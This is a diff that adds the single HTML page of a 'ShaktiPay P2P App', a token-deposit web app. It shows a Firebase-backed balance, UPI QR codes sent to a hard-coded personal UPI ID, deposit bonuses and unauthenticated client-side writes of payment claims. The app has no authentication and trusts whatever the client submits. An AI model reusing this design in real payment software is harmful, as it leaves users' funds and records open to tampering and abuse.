@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ShaktiPay P2P App</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* ... Same CSS style as before ... */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
+        body { background-color: #fcf8f5; color: #333; }
+        .app-container { max-width: 400px; margin: auto; background-color: #fdfaf7; min-height: 100vh; position: relative; padding-bottom: 80px; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
+        .top-header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; }
+        .user-profile { display: flex; align-items: center; gap: 10px; }
+        .avatar { width: 40px; height: 40px; background-color: #cce0ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #4a8cff; font-size: 20px; }
+        .user-info h3 { font-size: 16px; color: #5c3c21; }
+        .user-info p { font-size: 12px; color: #888; }
+        .balance-card { background: linear-gradient(135deg, #ff9b30, #ff7114); margin: 10px 20px; border-radius: 12px; padding: 20px; color: white; position: relative; box-shadow: 0 4px 10px rgba(255, 113, 20, 0.3); }
+        .balance-card h1 { font-size: 32px; margin: 10px 0; }
+        .detail-btn { position: absolute; right: 20px; bottom: 20px; background: white; color: #ff7114; border: none; padding: 6px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; cursor: pointer; }
+        .dep-with-card { background: linear-gradient(to right, #f4791f, #f59123); margin: 10px 20px; border-radius: 10px; display: flex; color: white; padding: 15px 0; }
+        .dw-box { flex: 1; text-align: center; border-right: 1px solid rgba(255,255,255,0.3); cursor: pointer; }
+        .dw-box:last-child { border: none; }
+        .action-grid { display: flex; justify-content: space-around; padding: 15px 10px; text-align: center; }
+        .action-item { display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer; }
+        .action-icon { width: 50px; height: 50px; background: white; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; color: #555; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #eee; }
+        .action-item span { font-size: 12px; font-weight: bold; color: #5c3c21;}
+        .page-content { display: none; padding: 15px; }
+        .page-content.active { display: block; }
+        .page-title { text-align: center; font-size: 20px; color: #5c3c21; margin-bottom: 15px; font-weight: bold; }
+        .payment-card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); text-align: center; }
+        .input-field { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; }
+        .primary-btn { background: #f4791f; color: white; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        .qr-box { display: none; margin-top: 15px; background: #fafafa; padding: 15px; border-radius: 8px; border: 1px dashed #f4791f; text-align: center; }
+        .qr-box img { width: 180px; height: 180px; margin: 10px 0; }
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; max-width: 400px; background: white; display: flex; justify-content: space-between; padding: 10px 20px; box-shadow: 0 -2px 10px rgba(0,0,0,0.05); border-top-left-radius: 15px; border-top-right-radius: 15px; z-index: 1000; }
+        .nav-item { text-align: center; color: #888; font-size: 10px; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; }
+        .nav-item i { font-size: 20px; }
+        .nav-item.active { color: #f4791f; font-weight: bold;}
+        .nav-center { position: relative; top: -20px; }
+        .nav-center .circle { width: 55px; height: 55px; background: #f4791f; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; box-shadow: 0 4px 10px rgba(244, 121, 31, 0.4); border: 4px solid #fdfaf7; }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <!-- HOME PAGE -->
+        <div id="homePage" class="page-content active">
+            <div class="top-header">
+                <div class="user-profile">
+                    <div class="avatar"><i class="fa-solid fa-user"></i></div>
+                    <div class="user-info">
+                        <h3 id="displayUsername">Abhinav7070</h3>
+                        <p>ID: 224709</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REAL BALANCE CARD -->
+            <div class="balance-card">
+                <p>Available Balance</p>
+                <h1 id="userBalance">₹ 0.00</h1>
+            </div>
+
+            <div class="dep-with-card">
+                <div class="dw-box" onclick="switchPage('paymentPage')">
+                    <p><i class="fa-solid fa-arrow-up" style="color:#a8ffc8;"></i> Deposit</p>
+                    <h3>Buy Token</h3>
+                </div>
+                <div class="dw-box" onclick="switchPage('myPage')">
+                    <p><i class="fa-solid fa-arrow-down" style="color:#ffb3b3;"></i> Withdrawal</p>
+                    <h3>Sell Token</h3>
+                </div>
+            </div>
+            
+            <div class="action-grid">
+                <div class="action-item" onclick="alert('Admin Panel Ke Liye browser me url me /admin.html likhein')">
+                    <div class="action-icon"><i class="fa-solid fa-screwdriver-wrench"></i></div>
+                    <span>Admin Panel</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAYMENT PAGE (BUY ORDER SELECTION & QR) -->
+        <div id="paymentPage" class="page-content">
+            <div class="page-title">Select Order to Buy</div>
+            
+            <div class="order-list" style="display: flex; flex-direction: column; gap: 12px;">
+                <div class="order-card" onclick="selectOrder(100)" style="background: white; padding: 15px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); cursor: pointer; border: 1px solid #eee;">
+                    <div><h4 style="color: #f4791f; font-size: 20px;">₹ 100</h4><p style="font-size: 12px; color: #28a745; font-weight: bold;">Bonus: +₹3.80</p></div>
+                    <button style="background: #f4791f; color: white; border: none; padding: 8px 18px; border-radius: 6px; font-weight: bold; cursor: pointer;">Buy</button>
+                </div>
+                <!-- ... Added basic order cards to keep it clean ... -->
+                <div class="order-card" onclick="selectOrder(500)" style="background: white; padding: 15px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); cursor: pointer; border: 1px solid #eee;">
+                    <div><h4 style="color: #f4791f; font-size: 20px;">₹ 500</h4><p style="font-size: 12px; color: #28a745; font-weight: bold;">Bonus: +₹19.00</p></div>
+                    <button style="background: #f4791f; color: white; border: none; padding: 8px 18px; border-radius: 6px; font-weight: bold; cursor: pointer;">Buy</button>
+                </div>
+            </div>
+
+            <!-- Dynamic QR Code Container -->
+            <div id="qrCodeContainer" class="qr-box">
+                <h3 style="color:#f4791f;">Selected Order: ₹<span id="selectedAmountDisplay">0</span></h3>
+                <p style="font-size:12px; color:#555; margin-top:5px;">Scan QR using PhonePe, Paytm, or Google Pay:</p>
+                <img id="qrImage" src="" alt="UPI QR Code">
+                <p style="font-size:13px; font-weight:bold; color:#f4791f;">UPI ID: <span id="merchantUpi">yourupi@upi</span></p>
+                <hr style="margin: 15px 0; border: 0.5px solid #eee;">
+                <p style="font-size:12px; color:#333; margin-bottom:5px;">Enter 12-Digit UTR / Txn ID after payment:</p>
+                <input type="text" id="utrInput" class="input-field" placeholder="e.g. 420192837412" maxlength="12">
+                <button class="primary-btn" style="background:#28a745;" onclick="submitPaymentToFirebase()">Submit Payment Request</button>
+            </div>
+        </div>
+
+        <div id="statsPage" class="page-content"><div class="page-title">Statistics Page (Comming Soon)</div></div>
+        <div id="myPage" class="page-content"><div class="page-title">My Page (Comming Soon)</div></div>
+
+        <!-- BOTTOM NAVIGATION BAR -->
+        <div class="bottom-nav">
+            <div class="nav-item active" onclick="switchPage('homePage', this)"><i class="fa-solid fa-house"></i><span>Home</span></div>
+            <div class="nav-item" onclick="switchPage('paymentPage', this)"><i class="fa-solid fa-credit-card"></i><span>Payment</span></div>
+            <div class="nav-item nav-center" onclick="switchPage('paymentPage', this)"><div class="circle"><i class="fa-solid fa-wallet"></i></div></div>
+            <div class="nav-item" onclick="switchPage('statsPage', this)"><i class="fa-solid fa-chart-bar"></i><span>Statistics</span></div>
+            <div class="nav-item" onclick="switchPage('myPage', this)"><i class="fa-solid fa-circle-user"></i><span>My</span></div>
+        </div>
+    </div>
+
+    <!-- FIREBASE SCRIPT -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+        import { getDatabase, ref, push, set, onValue } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+
+        const firebaseConfig = {
+          apiKey: "AIzaSyCxU0-aRs0qnjrsdiTR5lojxnen8PwsxfU",
+          authDomain: "shakti-pay.firebaseapp.com",
+          databaseURL: "https://shakti-pay-default-rtdb.firebaseio.com",
+          projectId: "shakti-pay",
+          storageBucket: "shakti-pay.firebasestorage.app",
+          messagingSenderId: "603174782279",
+          appId: "1:603174782279:web:6220300ba1c4aff3597862"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // REAL-TIME BALANCE FETCHING LOGIC
+        const balanceRef = ref(database, 'users/Abhinav7070/balance');
+        onValue(balanceRef, (snapshot) => {
+            const balance = snapshot.val();
+            if (balance !== null) {
+                document.getElementById('userBalance').innerText = '₹ ' + balance.toFixed(2);
+            } else {
+                document.getElementById('userBalance').innerText = '₹ 0.00';
+            }
+        });
+
+        let selectedOrderAmount = 0;
+
+        window.switchPage = function(pageId, element) {
+            let pages = document.querySelectorAll('.page-content');
+            pages.forEach(page => page.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+
+            if(element) {
+                let navItems = document.querySelectorAll('.nav-item');
+                navItems.forEach(item => item.classList.remove('active'));
+                element.classList.add('active');
+            }
+        }
+
+        window.selectOrder = function(amount) {
+            selectedOrderAmount = amount;
+            let upiId = "palakkumari01@fam"; // <--- APNI UPI YAHAN DALEIN
+
+            let upiLink = `upi://pay?pa=${upiId}&pn=ShaktiPay&am=${amount}&cu=INR`;
+            let qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiLink)}`;
+            
+            document.getElementById('qrImage').src = qrApi;
+            document.getElementById('merchantUpi').innerText = upiId;
+            document.getElementById('selectedAmountDisplay').innerText = amount;
+            
+            let qrContainer = document.getElementById('qrCodeContainer');
+            qrContainer.style.display = 'block';
+            qrContainer.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        window.submitPaymentToFirebase = function() {
+            let utr = document.getElementById('utrInput').value;
+            let username = "Abhinav7070";
+
+            if(!utr || utr.length < 10) {
+                alert("Please enter a valid 12-digit UTR/Transaction ID");
+                return;
+            }
+
+            const depositsRef = ref(database, 'deposit_requests');
+            const newDepositRef = push(depositsRef);
+            
+            set(newDepositRef, {
+                username: username,
+                amount: Number(selectedOrderAmount),
+                utr: utr,
+                status: "Pending",
+                timestamp: new Date().toISOString()
+            }).then(() => {
+                alert("Payment request sent! Wait for Admin Approval.");
+                document.getElementById('utrInput').value = '';
+                document.getElementById('qrCodeContainer').style.display = 'none';
+                switchPage('homePage');
+            });
+        }
+    </script>
+</body>
+</html>
